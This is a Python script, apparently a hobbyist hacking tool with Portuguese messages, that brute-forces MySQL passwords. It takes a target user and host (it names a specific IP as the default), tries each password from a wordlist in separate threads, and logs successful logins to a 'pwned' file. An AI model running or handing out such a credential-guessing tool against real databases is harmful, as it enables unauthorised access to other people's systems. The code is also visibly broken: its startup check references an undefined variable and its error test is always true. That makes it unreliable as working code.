 #!usr/bin/python3
# -*- coding: utf-8 -*-
import mysql.connector as mysql
from mysql.connector.errors import Error
import time
import sys
import argparse as arg
import os
import _thread

def banner():
  print("""
______            _        ______                  ___  ___      _____  _____ _     _ 
| ___ \          | |       |  ___|                 |  \/  |     /  ___||  _  | |   (_)
| |_/ /_ __ _   _| |_ ___  | |_ ___  _ __ ___ ___  | .  . |_   _\ `--. | | | | |    _ 
| ___ \ '__| | | | __/ _ \ |  _/ _ \| '__/ __/ _ \ | |\/| | | | |`--. \| | | | |   | |
| |_/ / |  | |_| | ||  __/ | || (_) | | | (_|  __/ | |  | | |_| /\__/ /\ \/' / |___| |
\____/|_|   \__,_|\__\___| \_| \___/|_|  \___\___| \_|  |_/\__, \____/  \_/\_\_____/_|
                                                            __/ |                     
  V1.0 Criado por B4l0x - 18/05/2019                        |___/                  
  """)
banner()

parser = arg.ArgumentParser(description="MySQLi brute force by B4l0x")
parser.add_argument("--wordlist", "-w", help="Wordlist de senhas - DEFAULT: senhas.txt", required=True, default="senhas.txt", type=str)
parser.add_argument("--usuario", "-u", help="Usuario alvo", required=True, type=str)
parser.add_argument("--host", "-s", help="Host alvo - DEFAULT: 187.17.106.9", required=True, default="187.17.106.9", type=str)
parser.add_argument("--porta", "-p", help="Porta do host - DEFAULT: 3306", required=False, default=3306, type=int)
x = parser.parse_args()

user = x.usuario
porta = x.porta
server = x.host
tempo = time.strftime("%H:%M:%S")
alocthread = _thread.allocate_lock()

def backspace(n):
    sys.stdout.write((b'\x08' * n).decode()) # use \x08 char to go back

def brute(i):
  ii = i.replace("\n", "")
  try:
    con = mysql.connect(host=server, user=user, passwd=ii)
    arq = open("pwned-mysqli.txt", "a")
    arq.write("Host:{} Usuario:{} Senha: {}".format(server, user, ii))
    arq.close()
    print("\n\n\t[{} INFO] Pwned: {}@{}:{}\n".format(tempo, server, user, ii))
    exit()
  except mysql.Error as err:
    if Error(errno=1045):
      alocthread.acquire()
      string = str("[{} INFO] Incorreta: {}:{}".format(tempo, user, ii))
      sys.stdout.write(string)
      sys.stdout.flush()
      backspace(len(string))
      alocthread.release()
    else:
      print("Erro: {}".format(err))

def iniciar():
  try:
    try:
      wordlist = open(x.wordlist, 'r').readlines()
    except:
      print("\n[{} INFO] Verifique o caminho da wordlist e tente novamente...".format(tempo))
      exit()
    for i in wordlist:
      time.sleep(0.4)
      _thread.start_new_thread(brute, (i,))
    print("\n\n\t[{} INFO] Fim do teste, obrigado por usar by B4l0x...\n".format(tempo))
    _thread.exit()
  except KeyboardInterrupt:
    print("\n\n\t[{} INFO] Aguarde o script ser finalizado, obrigado por usar by B4l0x...\n".format(tempo))
    exit()
    
try:
  con = mysql.connect(host=server, user=user, passwd=ii)
except mysql.Error as err:
  if Error(errno=1045):
    print("[+] Host recebeu os pacotes")
    print("[+] Iniciando brute force\n")
    iniciar()
except:
  print("\n[!] Verifique servidor e porta e tente novamente, host sem resposta")
  exit()
